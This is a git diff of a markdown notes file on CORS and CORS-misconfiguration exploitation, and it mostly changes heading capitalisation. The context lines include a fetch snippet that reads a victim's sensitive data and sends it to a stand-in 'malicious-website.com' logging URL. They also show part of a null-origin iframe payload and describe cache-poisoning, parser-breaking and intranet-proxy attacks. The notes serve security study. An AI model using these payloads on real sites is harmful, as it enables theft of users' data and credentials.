@@ -14,7 +14,7 @@ Servers can also inform clients whether credentials should be sent with requests
 
 CORS failures result in errors, but specifics about the error are not available to JavaScript.
 
-## Simple Requests
+## Simple requests
 
 Simple requests don't trigger a CORS preflight. A simple request is one that meets **all** the following conditions:
 
@@ -39,11 +39,11 @@ Simple requests don't trigger a CORS preflight. A simple request is one that mee
 - No event listeners are registered on any `XMLHttpRequestUpload` object used in the request (these are accessed using the [XMLHttpRequest.upload](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/upload) property).
 - No [ReadableStream](https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream) object is used in the request.
 
-## Preflighted Requests
+## Preflighted requests
 
 Preflighted requests first send an HTTP request by the `OPTIONS` method to the resource on the other domain, to determine if the actual request is safe to send. 
 
-## Requests with Credentials
+## Requests with credentials
 
 Credentialed requests allow to send HTTP cookies and HTTP Authentication information (by default browsers will not send credentials).
 
@@ -51,7 +51,7 @@ When responding to a credentialed request, the server must specify an origin in 
 
 > Note: Cookies set in CORS responses are subject to normal third-party cookie policies.
 
-## The HTTP Request Headers
+## The HTTP request headers
 
 This section lists headers that clients may use when issuing HTTP requests in order to make use of the CORS feature. Note that these headers are set for you when making requests to servers. Developers using cross-site `XMLHttpRequest` capability do not have to set any CORS headers programmatically.
 
@@ -149,11 +149,11 @@ When a request's credentials mode ([Request.credentials](https://developer.mozil
 
 Credentials are cookies, authorization headers or TLS client certificates.
 
-# CORS Misconfiguration
+# CORS misconfiguration
 
 Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.
 
-## Generation the Access-Control-Allow-Origin Header
+## Generation the Access-Control-Allow-Origin header
 
 No browsers actually support a space-separated list of origins (the specification suggests this), like:
 
@@ -199,7 +199,7 @@ fetch("https://vulnerable-website.com/sensitive-victim-data", {
         document.location = "//malicious-website.com/log?key={0}".format(response.text());
     });
 ```
-## The null Origin
+## The null origin
 
 The specification for the `Origin` header supports the value `null`. Browsers might send the value `null` in the `Origin` header in various unusual situations:
 
@@ -240,7 +240,7 @@ fetch('https://vulnerable-website.com/sensitive-victim-data', {
 </script>"></iframe>
 ```
 
-## Breaking Parsers
+## Breaking parsers
 
 Useful references:
 - [Advanced CORS Exploitation Techniques](https://www.corben.io/advanced-cors-techniques/)
@@ -257,7 +257,7 @@ Origin: http://foo.com`.bar.net/
 
 Chrome and Firefox supported the `_` character in subdomains. This allow to use `_` instead of `` ` `` to exploit Firefox and Chrome users.
 
-## Abusing CORS without Credentials
+## Abusing CORS without credentials
 
 If the victim's network location functions as a kind of authentication, then you can use a victim’s browser as a proxy to bypass IP-based authentication and access intranet applications. In terms of impact this is similar to DNS rebinding, but much less fiddly to exploit.
 
@@ -273,7 +273,7 @@ HTTP header whenever `Access-Control-Allow-Origin` headers are dynamically gener
 
 That might sound pretty simple, but immense numbers of people forget, including the [W3C itself](https://lists.w3.org/Archives/Public/public-webappsec/2016Jun/0057.html). 
 
-### Client-Side Cache Poisoning
+### Client-side cache poisoning
 
 Say a web page reflects the contents of a custom header without encoding (reflected XSS in a custom HTTP header):
 
@@ -295,7 +295,7 @@ Without CORS, this is impossible to exploit as there’s no way to make someone�
 
 With CORS, we can make them send this request. By itself, that's useless since the response containing our injected JS won't be rendered. However, if `Vary: Origin` hasn't been specified the response may be stored in the browser's cache and displayed directly when the browser navigates to the associated URL.
 
-## Server-side Cache Poisoning
+## Server-side cache poisoning
 
 If an application reflects the `Origin` header without even checking it for illegal characters like `\r`, we effectively have a HTTP header injection vulnerability against IE/Edge users as IE and Edge view `\r (0x0d)` as a valid HTTP header terminator:
 
@@ -368,9 +368,9 @@ In this situation, an attacker who is in a position to intercept a victim user's
 
 This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.
 
-## References
+# References
 
-- [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy),
+- [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
 - [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
 - [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
 - [Tricky CORS Bypass in Yahoo! View](https://www.corben.io/tricky-CORS/)
